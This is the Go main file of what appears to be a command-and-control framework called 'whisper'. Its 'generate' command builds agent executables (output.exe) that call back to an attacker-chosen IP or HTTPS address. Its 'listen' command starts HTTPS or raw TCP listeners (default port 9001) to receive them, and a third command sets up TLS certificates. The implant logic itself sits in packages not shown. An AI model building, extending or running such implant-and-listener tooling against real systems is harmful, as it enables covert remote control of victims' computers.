package main

import (
	"fmt"
	"net"
	"os"
	"whisper/agent"
	"whisper/internal/certgen"
	"whisper/server/https"
	"whisper/server/rawtcp"
)

func main() {

	if len(os.Args) < 2 {
		fmt.Println("Usage: whisper [generate|listen|certificates]")
		return
	}

	switch os.Args[1] {
	case "generate":
		if len(os.Args) < 5 {
			fmt.Println("Usage:")
			fmt.Println("  whisper generate https [output.exe] [https://IP]")
			fmt.Println("  whisper generate rawtcp [output.exe] [IP:PORT]")
			return
		}
		protocol := os.Args[2]
		output := os.Args[3]
		c2addr := os.Args[4]

		if protocol == "rawtcp" {
			if _, _, err := net.SplitHostPort(c2addr); err != nil {
				fmt.Println("[-] Invalid format for rawtcp. Use IP:PORT like 127.0.0.1:9001")
				return
			}
		}
		agent.Generate(protocol, output, c2addr)
	case "listen":
		if len(os.Args) < 3 {
			fmt.Println("Usage: whisper listen [https|rawtcp] [port]")
			return
		}

		switch os.Args[2] {
		case "https":
			https.Start()
		case "rawtcp":
			port := "9001"
			if len(os.Args) >= 5 {
				port = os.Args[4]
			}
			rawtcp.Start(port)
		default:
			fmt.Println("Unknown listener type")
		}
	case "certificates":
		if len(os.Args) < 2 {
			fmt.Println("Usage: whisper certificates")
			return
		}
		if err := certgen.EnsureCertificate(); err != nil {
			fmt.Println("[-] Failed to generate or verify TLS cert:", err)
			os.Exit(1)
		}
	default:
		fmt.Println("Unknown command:", os.Args[1])
	}
}
